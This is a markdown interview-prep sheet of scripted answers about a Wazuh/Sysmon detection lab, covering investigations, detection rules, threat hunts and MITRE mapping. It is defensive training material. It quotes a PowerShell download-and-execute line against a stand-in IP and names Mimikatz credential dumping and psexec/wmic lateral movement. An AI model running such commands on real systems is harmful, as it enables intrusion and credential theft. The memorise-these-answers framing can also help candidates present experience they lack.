# L1.5/L2 Interview: Counter-Question Prep
**Only the questions that catch people who didn't actually do the work. Memorize these 20 answers.**

---

## 🎯 The "Prove You Built It" Questions

### 1. "Walk me through your lab network. How does the Windows endpoint talk to Wazuh?"
**Answer:** "Three VMs on VMware Host-Only (vmnet1, 192.168.56.0/24). Wazuh Manager at .10, Windows at .20, Kali at .30. Windows has Sysmon 15 (SwiftOnSecurity config) + Wazuh Agent 4.8 pointed at 192.168.56.10. Agent enrolls via port 1515, sends logs over 1514. I see it in Wazuh Dashboard under Agents → Active."

### 2. "How did you generate the attacks? Did you just run scripts or understand what they do?"
**Answer:** "Atomic Red Team on Kali. `Invoke-AtomicTest T1059.001 -TestNumbers 1` runs a specific test case — I read the YAML first to know exactly what it executes (e.g., `powershell -enc <base64>` downloading from a test IP). I don't just run; I map each test to a technique ID before running."

### 3. "Your capstone says 'simulated DC at 192.168.56.40' — but you only have 3 VMs. How did lateral movement work?"
**Answer:** "The DC was simulated — I ran the lateral movement tools (psexec, wmic) from the Windows endpoint targeting a non-existent IP, but the *source* events (process creation, network connections, service creation attempts) still generated on the Windows endpoint. Wazuh captured the attacker-side telemetry: psexec.exe execution, SMB connection attempts, sc.exe remote create syntax. In a real lab I'd add a 4th VM for the DC."

---

## 🔍 The "Prove You Investigated" Questions

### 4. "In your brute force investigation, how did you correlate the successful logon to the PowerShell execution?"
**Answer:** "Two pivots: (1) Time — 4624 success at 14:18:31, then 4688 PowerShell at 14:18:35, same host, same user (labuser). (2) Process ancestry — 4688 showed ParentImage: cmd.exe, which had ParentImage: winlogon.exe (interactive logon). Queried `event.code:4688 AND win.targetuser:labuser` in WQL."

### 5. "How did you decode the PowerShell `-enc` command? Show me."
**Answer:** "Copied the base64 string from the 4688 CommandLine field. On Kali: `echo '<base64>' | base64 -d`. Output: `IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/payload.ps1')`. Saved the decoded payload as evidence with SHA256."

### 6. "You saw a C2 beacon in Suricata. How did you know it was a beacon, not normal traffic?"
**Answer:** "Three indicators: (1) Regular interval — GET /beacon every 60s ±2s for 3 hours (Suricata http logs, date_histogram aggregation). (2) Consistent payload size — ~200 bytes each request. (3) Single JA3 fingerprint (a0e9f5...) matching PowerShell default TLS client. Normal traffic has variance."

### 7. "How did you distinguish the lateral movement from normal admin SMB traffic?"
**Answer:** "Three filters: (1) Source: win-endpoint (user workstation), not a management host. (2) Tool signatures: psexec.exe → PSEXESVC service creation (EventID 4697), wmiprvse.exe spawning cmd.exe (EventID 1). (3) Account: administrator logon Type 3 from non-admin workstation. Normal admin traffic comes from designated jump boxes."

---

## ⚙️ The "Prove You Engineered Detections" Questions

### 8. "Your DET-001 catches PowerShell encoded + network. What's the false positive rate and how did you tune it?"
**Answer:** "Before tuning: ~15/day in lab (mostly admin deployment tools using encoded scripts). Tuned via Wazuh CDB allowlist on `parentImage` — excluded `C:\Program Files\DeploymentAgent\agent.exe` and known backup agents. After: 0.5/day. Verified by running Atomic T1059.001 3x — all alerted."

### 9. "Why use a CDB allowlist instead of just raising the rule level?"
**Answer:** "Raising level just hides alerts; CDB keeps the logic intact but adds context-aware exceptions. If a new admin tool appears, I add its parent path to CDB — no rule rewrite. Also lets me keep severity HIGH for real threats."

### 10. "Your LSASS rule (DET-007) uses GrantedAccess 0x1010. What does that mean and why not just 0x1fffff?"
**Answer:** "0x1010 = VM_READ | PROCESS_QUERY_LIMITED — the minimal rights Mimikatz needs for `sekurlsa::logonpasswords`. 0x1fffff = PROCESS_ALL_ACCESS (procdump default). I alert on both but 0x1010 is more specific to credential dumping; 0x1fffff catches legitimate debuggers too. I allowlist EDR/AV processes via CDB on SourceImage."

### 11. "Show me the same detection logic in Sigma vs Wazuh. Why both?"
**Answer:** "Sigma is portable — I can hand it to a team using Elastic, Splunk, or Sentinel. Wazuh XML is for my lab. Same logic: `Image endswith powershell.exe` + `CommandLine contains -enc|iex` + `EventID 3 (network)` within 60s. Sigma uses `condition: selection_powershell and selection_encoded and selection_network`. Wazuh uses `<same_field name="processId"/>` + timeframe. Portable logic, platform-native syntax."

---

## 🎯 The "Prove You Hunt" Questions

### 12. "Your Hunt-001 found certutil → PowerShell → rundll32. What was your hypothesis and how did you structure the hunt?"
**Answer:** "PEAK framework. **Prepare**: Hypothesis — 'Adversaries use signed binaries (LOLBAS) for defense evasion.' Targeted certutil, rundll32, mshta, regsvr32. **Execute**: Queried Sysmon EventID 1 for these binaries *outside* System32/SysWOW64. Found certutil in Temp. Pivoted to child processes → PowerShell with IEX DownloadString. **Analyze**: Correlated with EventID 3 (network) → HTTPS to rare domain. Separate query: EventID 10 for LSASS access from rundll32. **Knowledge**: Created DET-001 (composite) and DET-006 (rundll32 proxy)."

### 13. "How do you know your hunt queries didn't miss anything? What about false negatives?"
**Answer:** "I validate with Atomic Red Team — run the technique, confirm my query catches it. For Hunt-001, ran Atomic T1218.011 (rundll32), T1105 (certutil), T1059.001 (PS) — all generated events my queries found. False negatives would mean Atomic test runs but my query returns zero — that's how I catch gaps."

### 14. "You hunted for DNS tunneling (Hunt-004) and found nothing. Was the hunt a failure?"
**Answer:** "No — negative result is a finding. It means: (1) My lab's C2 used HTTP, not DNS. (2) My DNS query logic works (tested with known tunneling tools in isolation). (3) I now know DNS tunneling isn't in *this* environment's threat profile, but I have the query ready if it appears. Documented the query and entropy threshold (>3.5) for future use."

---

## 📊 The "Prove You Understand MITRE" Questions

### 15. "You claim 21 techniques covered. Pick one and explain the detection gap you'd fix next."
**Answer:** "T1021.006 (WinRM). I have a hunt query for `wsmprovhost.exe` spawning PowerShell, but no tuned detection rule yet. Gap: WinRM lateral is stealthier than SMB — no service creation, just remote shell. Next step: Wazuh rule for EventID 1 where ParentImage=wsmprovhost.exe AND Image=powershell.exe, with allowlist for approved management hosts."

### 16. "Why no coverage in Reconnaissance or Impact?"
**Answer:** "Reconnaissance (T1590, T1595) is mostly external — threat intel / ASM domain, not SOC detection. Impact (T1486 ransomware, T1490 inhibit recovery) — I'd detect the *precursors* (mass file encryption via T1005 + T1486 behavior, or vssadmin delete via T1490) which map to Defense Evasion/Collection techniques I already cover. SOC detects the *execution*, not the strategic intent."

---

## 🛠️ The "Prove You Know the Tools" Questions

### 17. "How do you query Wazuh for 'PowerShell spawned by Word'?"
**Answer:** `event.code:1 AND win.eventdata.parentImage:*winword.exe AND win.eventdata.image:*powershell.exe` — or in Wazuh Dashboard Discover: `win.eventdata.parentImage:winword.exe AND win.eventdata.image:powershell.exe`. Time-range last 10 min."

### 18. "In Splunk, how do you join process creation (4688) to network (EventCode=3) on PID?"
**Answer:** 
```spl
index=winevents EventCode=4688 New_Process_Name="*powershell.exe" Command_Line="*-enc*"
| eval ps_pid=ProcessId, ps_time=_time
| join type=left ps_pid, ps_time
    [ search index=winevents EventCode=3
    | eval net_pid=ProcessId, net_time=_time
    | where (net_time - ps_time) < 60
    | stats values(DestinationIp) as dest_ips by net_pid, net_time ]
| where isnotnull(dest_ips)
```

### 19. "What Sysmon Event IDs matter most for your detections?"
**Answer:** "1 (Process Create — command line, parent), 3 (Network — dest IP/port), 7 (Image Load — DLLs), 8 (CreateRemoteThread), 10 (Process Access — LSASS), 11 (File Create), 12/13/14 (Registry — Run keys), 15 (File Hash), 22 (DNS), 25 (Process Tampering). My rules use 1, 3, 10, 11, 12/13/14, 4688/4697/4698/5145 from Windows Security."

### 20. "How do you handle evidence preservation in your lab?"
**Answer:** "Every investigation: SHA256 hash all exports (logs, PCAP, memory, disk). `sha256sum evidence/* > evidence/hashes.txt`. Memory: WinPMEM → raw dump. Disk: FTK Imager logical (Users, Temp, Registry). PCAP: Suricata Eve + Wireshark capture. Chain of custody: documented in report with timestamps, analyst name, hash verification. In production I'd use encrypted storage and formal CoC forms."

---

## 🎯 The One Question That Exposes Everyone

### "If I gave you a fresh alert right now — suspicious PowerShell on a host you've never seen — what are your first 3 queries?"

**Your Answer (memorize this flow):**

1. **Triage:** `event.code:4688 AND win.eventdata.image:*powershell.exe AND win.eventdata.commandLine:(*-enc* OR *iex* OR *downloadstring*) AND agent.name:<host>` — get the process, command line, PID, parent, user, time.

2. **Network pivot:** `event.code:3 AND win.eventdata.sourceProcessId:<PID from #1>` — any outbound connections? Dest IPs, ports, frequency.

3. **Behavior chain:** `event.code:1 AND win.eventdata.parentProcessId:<PID from #1>` — what did it spawn? Child processes, file writes (EventID 11), registry (12/13/14), scheduled tasks (4698).

**Then:** Correlate time → MITRE map → enrich IPs (VT, AbuseIPDB) → decide TP/FP → document.

---

## 📋 Cheat Sheet: Keep This Open During Interview

| Portfolio Piece | One-Liner Proof |
|-----------------|-----------------|
| Lab | "VMware Host-Only, 3 VMs, Wazuh single-node, Sysmon SwiftOnSecurity, Atomic Red Team" |
| Inv-001 (Brute Force) | "4625×247 → 4624 success → 4688 PS -enc → base64 decode → HTTP to 203.0.113.45 → Suricata beacon" |
| Inv-002 (Hunt) | "Hypothesis: LOLBAS. Query: certutil/rundll32 outside System32 → certutil decode → PS child → HTTPS → rundll32 LSASS dump" |
| Inv-003 (Capstone) | "Phishing → PS → Scheduled Task + Run Key → nmap → psexec/wmic → staging → HTTP exfil + beacon. 11 techniques, 7 tactics" |
| DET-001 | "Composite: PS encoded + network within 60s. Wazuh XML+CDB, Splunk join, Suricata UA+pcre, Sigma. FP 15→0.5/day" |
| DET-007 | "LSASS access EventID 10, GrantedAccess 0x1010/0x1fffff. CDB allowlist for EDR. Tested Mimikatz, comsvcs, procdump" |
| Hunts | "PEAK framework. Hypothesis → queries → findings → rules. Negative results documented (DNS tunneling)" |
| MITRE | "21 techniques, 8 tactics. Focus: Execution, Persistence, Credential Access, Lateral, C2. Gaps: Recon, Impact — by design" |

---

**You don't need to memorize everything. You need to own these 20 answers. The rest is "I'd look that up in my repo."**

---

*File: `INTERVIEW_QA_PREP.md` — commit to repo if you want.*